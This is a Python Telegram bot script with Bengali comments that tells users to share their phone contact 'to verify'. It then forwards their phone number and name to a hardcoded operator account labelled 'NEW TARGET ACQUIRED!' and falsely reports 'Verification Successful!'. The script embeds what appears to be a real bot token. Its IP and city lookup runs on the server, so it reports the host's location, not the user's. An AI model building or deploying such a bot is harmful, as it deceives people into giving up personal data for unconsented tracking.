import telebot
import requests
import os
from threading import Thread
from flask import Flask

# ১. রেন্ডারের 'No open ports' সমস্যা সমাধানের জন্য ফ্লাস্ক সার্ভার
app = Flask('')

@app.route('/')
def home():
    return "Bot is Live and Running!"

def run():
    # রেন্ডার অটোমেটিক পোর্ট অ্যাসাইন করবে, না পেলে ৮০৮০ ব্যবহার করবে
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# ২. আপনার বটের মেইন কনফিগারেশন
API_TOKEN = '8580731044:AAESaTbEO65fLxF3WiZnPtyUTYjajrhkR-I'
MY_ID = '8046944525'

bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    # আপনার সেই প্রথম লাইভ ভার্সনের ওয়েলকাম মেসেজ
    bot.reply_to(message, "Welcome! Please share your contact to verify.")

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    try:
        # IP বের করার স্টেবল মেথড
        response = requests.get("http://ip-api.com/json/", timeout=10).json()
        ip = response.get("query", "N/A")
        city = response.get("city", "Unknown")
        
        text = "🚀 **NEW TARGET ACQUIRED!**\n\n"
        text += f"📱 **Phone:** `{message.contact.phone_number}`\n"
        text += f"👤 **Name:** {message.contact.first_name}\n"
        text += f"🌐 **IP:** `{ip}`\n"
        text += f"📍 **City:** {city}"
        
        # আপনার আইডিতে তথ্য পাঠানো
        bot.send_message(MY_ID, text, parse_mode="Markdown")
        # ইউজারকে সাকসেস মেসেজ দেখানো
        bot.send_message(message.chat.id, "✅ Verification Successful!")
    except Exception as e:
        print(f"Error occurred: {e}")

if __name__ == "__main__":
    # সার্ভারকে আলাদা থ্রেডে চালানো যাতে বটের কাজে বাধা না দেয়
    Thread(target=run).start()
    print("SERVER STARTING...")
    
    # কনফ্লিক্ট এড়ানোর জন্য ক্লিনিং এবং পোলিং শুরু
    bot.remove_webhook()
    bot.infinity_polling(none_stop=True, timeout=60)
